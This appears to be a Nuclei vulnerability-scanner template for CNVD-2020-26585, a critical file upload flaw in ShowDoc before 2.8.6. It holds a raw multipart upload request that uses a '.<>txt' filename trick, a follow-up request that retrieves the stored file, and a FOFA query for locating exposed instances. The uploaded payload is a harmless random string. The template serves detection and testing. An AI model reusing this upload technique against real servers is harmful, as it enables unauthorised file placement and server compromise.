http:
- extractors:
  - group: 1
    internal: true
    name: date
    part: body
    regex:
    - (\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.txt)
    type: regex
  - group: 2
    internal: true
    name: file
    part: body
    regex:
    - (\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.txt)
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - body_2 == str1
    type: dsl
  raw:
  - 'POST /index.php?s=/home/page/uploadImg HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633


    ----------------------------835846770881083140190633

    Content-Disposition: form-data; name="editormd-image-file"; filename="{{randstr}}.<>txt"

    Content-Type: text/plain


    {{str1}}

    ----------------------------835846770881083140190633--

    '
  - 'GET /Public//Uploads//{{date}}//{{file}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CNVD-2020-26585
info:
  author: pikpikcu,Co5mos
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
    cvss-score: 9.9
    cwe-id: CWE-434
  description: 'ShowDoc is an online API and technical documentation tool that is
    very suitable for IT teams. Showdoc has a file upload vulnerability, which attackers
    can exploit to gain server permissions.

    '
  metadata:
    fofa-query: app="ShowDoc"
    max-request: 2
    verified: true
  name: Showdoc <2.8.6 - File Uploads
  reference:
  - https://vul.wangan.com/a/CNVD-2020-26585
  - https://blog.csdn.net/qq_48985780/article/details/122211136
  - https://github.com/star7th/showdoc/pull/1059
  severity: critical
  tags: cnvd,cnvd2020,showdoc,fileupload,intrusive
variables:
  str1: '{{randstr}}'
